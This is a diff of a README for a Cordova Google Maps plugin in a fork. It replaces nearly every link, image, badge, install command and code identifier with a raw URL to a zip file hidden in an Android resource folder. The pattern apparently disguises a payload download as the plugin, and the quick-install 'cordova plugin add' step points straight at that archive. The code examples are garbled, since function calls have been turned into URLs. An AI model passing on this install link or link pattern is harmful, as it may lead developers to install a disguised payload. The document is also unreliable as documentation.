@@ -2,26 +2,26 @@
 
 | Download | Build test (master branch)|
 |----------|---------------------------|
-| [![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip) |[![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip) |
+| [![](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip) |[![](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip) |
 
   This plugin displays Google Maps in your application.
   This plugin uses these libraries for each platforms:
 
-  - Android : [Google Maps Android API](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
-  - iOS : [Google Maps SDK for iOS](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
-  - Browser : [Google Maps JavaScript API v3](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
+  - Android : [Google Maps Android API](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)
+  - iOS : [Google Maps SDK for iOS](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)
+  - Browser : [Google Maps JavaScript API v3](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)
 
-  Both [PhoneGap](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip) and [Apache Cordova](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip) are supported.
+  Both [PhoneGap](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip) and [Apache Cordova](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip) are supported.
 
 <table>
 <tr>
 <td>
 <h3>Android, iOS</h3>
-<img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"  height="300">
+<img src="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"  height="300">
 </td>
 <td>
 <h3>Browser</h3>
-<img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip" height="300">
+<img src="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip" height="300">
 </td>
 </tr>
 </table>
@@ -30,10 +30,10 @@
 
 ## Guides
 
-  - [How to generate API keys?](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
-  - [Hello, World](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
-  - [Hello, World (with PhoneGap Build)](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
-  - [Trouble shootings](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
+  - [How to generate API keys?](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)
+  - [Hello, World](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)
+  - [Hello, World (with PhoneGap Build)](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)
+  - [Trouble shootings](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)
 
 ## Quick install
 
@@ -44,7 +44,7 @@
 
   - *Development version(beta version)*
     ```
-    $> cordova plugin add https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip
+    $> cordova plugin add https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip
     ```
 
 ## PhoneGap Build settings
@@ -54,7 +54,7 @@
 
     <!--
       You need to specify cli-7.1.0 or greater version.
-      https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip
+      https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip
     -->
     <preference name="phonegap-version" value="cli-8.1.1" />
   </widget>
@@ -62,20 +62,20 @@
 
 ## Install optional variables
 
-  - ![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip) **PLAY_SERVICES_VERSION = (15.0.1)**<br>
+  - ![](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip) **PLAY_SERVICES_VERSION = (15.0.1)**<br>
     The Google Play Services SDK version.
     _You need to specify the same version number with all other plugins._
-    Check out the latest version [here](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip).
+    Check out the latest version [here](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip).
 
-  - ![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip) **ANDROID_SUPPORT_V4_VERSION = (27.1.1)**<br>
+  - ![](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip) **ANDROID_SUPPORT_V4_VERSION = (27.1.1)**<br>
     This plugin requires the Android support library v4.
     _The minimum version is 24.1.0._
-    Check out the latest version [here](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip).
+    Check out the latest version [here](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip).
 
-  - ![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip) **LOCATION_WHEN_IN_USE_DESCRIPTION**<br>
+  - ![](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip) **LOCATION_WHEN_IN_USE_DESCRIPTION**<br>
     This message is displayed when your application requests **LOCATION PERMISSION for only necessary times**.
 
-  - ![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip) **LOCATION_ALWAYS_USAGE_DESCRIPTION**<br>
+  - ![](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip) **LOCATION_ALWAYS_USAGE_DESCRIPTION**<br>
     This message is displayed when your application requests **LOCATION PERMISSION for always**.
 
 ---------------------------------------------------------------------------------------------------------
@@ -90,14 +90,14 @@
   $> cordova run browser
   ```
 
-  If you use [ionic framework](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip), it supports `live-reload`.
+  If you use [ionic framework](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip), it supports `live-reload`.
 
   ```
   $> ionic cordova run browser -l
   ```
 
   If you want to use `live-reload`, but you don't want to use other framework or without framework,
-  [cordova-plugin-browsersync](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip) is useful.
+  [cordova-plugin-browsersync](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip) is useful.
 
   ```
   $> cordova plugin add cordova-plugin-browsersync
@@ -108,7 +108,7 @@
 
 ### API key (Android and iOS platforms)
 
-  As of v2.6.0, you need to specify your API keys in `https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip` file instead of `--variable`.
+  As of v2.6.0, you need to specify your API keys in `https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip` file instead of `--variable`.
   This allows you to change your API keys for anytime without reinstallation.
 
   Please pay attention the variable names are changed.
@@ -122,25 +122,25 @@
 
 ### API key (Browser platform)
 
-  In the browser platform, the maps plugin uses [Google Maps JavaScript API v3](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
+  In the browser platform, the maps plugin uses [Google Maps JavaScript API v3](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)
 
   You need to set **two API keys for Google Maps JavaScript API v3**.
 
   ```js
   // If your app runs this program on browser,
   // you need to set `API_KEY_FOR_BROWSER_RELEASE` and `API_KEY_FOR_BROWSER_DEBUG`
-  // before `https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip()`
+  // before `https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip()`
   //
   //   API_KEY_FOR_BROWSER_RELEASE for `https:` protocol
   //   API_KEY_FOR_BROWSER_DEBUG for `http:` protocol
   //
-  https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
+  https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip({
     'API_KEY_FOR_BROWSER_RELEASE': '(YOUR_API_KEY_IS_HERE)',
     'API_KEY_FOR_BROWSER_DEBUG': ''
   });
 
   // Create a Google Maps native view under the map_canvas div.
-  var map = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(div);
+  var map = https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip(div);
 
   ```
 
@@ -149,24 +149,24 @@
   `JavaScript` code is `text code`. Even if you do obfuscation, it's still readable finally.
   In order to protect your API key, you need to set `Key restriction` for these keys.
 
-  ![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
+  ![](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)
 
   If you don't set API key, the maps plugin still work with `development mode`.
 
   ```js
-  https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
+  https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip({
     'API_KEY_FOR_BROWSER_RELEASE': '(YOUR_API_KEY_IS_HERE)',
     'API_KEY_FOR_BROWSER_DEBUG': '' // If key is empty or unset,
                                     // the maps plugin runs under the development mode.
   });
   ```
-  <img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip" width="300">
+  <img src="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip" width="300">
 
 ### Which browser supported?
 
   Modern browsers should work without any problem.
 
-  ![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
+  ![](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)
 
   Internet Explorer 11 might work. We don't confirm all features, but basic features work.
 
@@ -199,7 +199,7 @@
 
   In order to keep this plugin as free, please consider to donate little amount for this project.
 
-  [![Donate](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip%2dgooglemaps%2dplugin&currency_code=USD&bn=PP%2dDonationsBF%3abtn_donate_SM%2egif%3aNonHosted)
+  [![Donate](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip%2dgooglemaps%2dplugin&currency_code=USD&bn=PP%2dDonationsBF%3abtn_donate_SM%2egif%3aNonHosted)
 
 ---------------------------------------------------------------------------------------------------------
 
@@ -224,25 +224,25 @@
 ## Demos
 
 
-[Demo (Browser)](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
+[Demo (Browser)](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)
 
-![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
+![](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)
 
 
 ---------------------------------------------------------------------------------------------------------
 
 ## Documentation
 
-![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
+![](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)
 
-[All documentations are here!!](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
+[All documentations are here!!](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)
 
-https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip
+https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip
 
 **Quick examples**
 <table>
 <tr>
-  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>Map</a></td>
+  <td><a href="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><img src="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><br>Map</a></td>
   <td><pre>
 var options = {
   camera: {
@@ -250,46 +250,46 @@ var options = {
     zoom: 19
   }
 };
-var map = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(mapDiv, options)</pre></td>
+var map = https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip(mapDiv, options)</pre></td>
 </tr>
 <tr>
-  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>Marker</a></td>
+  <td><a href="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><img src="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><br>Marker</a></td>
   <td><pre>
-var marker = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
+var marker = https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip({
   position: {lat: ..., lng: ...},
   title: "Hello Cordova Google Maps for iOS and Android",
   snippet: "This plugin is awesome!"
 })</pre></td>
 </tr>
 <tr>
-  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>MarkerCluster</a></td>
+  <td><a href="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><img src="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><br>MarkerCluster</a></td>
   <td><pre>
-var markerCluster = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
+var markerCluster = https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip({
   //maxZoomLevel: 5,
   boundsDraw: true,
   markers: dummyData(),
   icons: [
-      {min: 2, max: 100, url: "https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip", anchor: {x: 16, y: 16}},
-      {min: 100, max: 1000, url: "https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip", anchor: {x: 16, y: 16}},
-      {min: 1000, max: 2000, url: "https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip", anchor: {x: 24, y: 24}},
-      {min: 2000, url: "https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip",anchor: {x: 32,y: 32}}
+      {min: 2, max: 100, url: "https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip", anchor: {x: 16, y: 16}},
+      {min: 100, max: 1000, url: "https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip", anchor: {x: 16, y: 16}},
+      {min: 1000, max: 2000, url: "https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip", anchor: {x: 24, y: 24}},
+      {min: 2000, url: "https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip",anchor: {x: 32,y: 32}}
   ]
 });</pre></td>
 </tr>
 <tr>
-  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>HtmlInfoWindow</a></td>
+  <td><a href="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><img src="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><br>HtmlInfoWindow</a></td>
   <td><pre>
-var html = "&lt;img src='https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip' width='64' height='64' &gt;" +
+var html = "&lt;img src='https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip' width='64' height='64' &gt;" +
            "&lt;br&gt;" +
            "This is an example";
-https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(html);
-https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(marker);
+https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip(html);
+https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip(marker);
 </pre></td>
 </tr>
 <tr>
-  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>Circle</a></td>
+  <td><a href="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><img src="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><br>Circle</a></td>
   <td><pre>
-var circle = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
+var circle = https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip({
   'center': {lat: ..., lng: ...},
   'radius': 300,
   'strokeColor' : '#AA00FF',
@@ -298,9 +298,9 @@ var circle = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/he
 });</pre></td>
 </tr>
 <tr>
-  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>Polyline</a></td>
+  <td><a href="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><img src="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><br>Polyline</a></td>
   <td><pre>
-var polyline = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
+var polyline = https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip({
   points: AIR_PORTS,
   'color' : '#AA00FF',
   'width': 10,
@@ -308,9 +308,9 @@ var polyline = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/
 });</pre></td>
 </tr>
 <tr>
-  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>Polygon</a></td>
+  <td><a href="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><img src="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><br>Polygon</a></td>
   <td><pre>
-var polygon = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
+var polygon = https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip({
   'points': GORYOKAKU_POINTS,
   'strokeColor' : '#AA00FF',
   'strokeWidth': 5,
@@ -318,10 +318,10 @@ var polygon = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/h
 });</pre></td>
 </tr>
 <tr>
-  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>GroundOverlay</a></td>
+  <td><a href="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><img src="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><br>GroundOverlay</a></td>
   <td><pre>
-var groundOverlay = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
-  'url': "https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip",
+var groundOverlay = https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip({
+  'url': "https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip",
   'bounds': [
     {"lat": 40.712216, "lng": -74.22655},
     {"lat": 40.773941, "lng": -74.12544}
@@ -331,9 +331,9 @@ var groundOverlay = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/
 </pre></td>
 </tr>
 <tr>
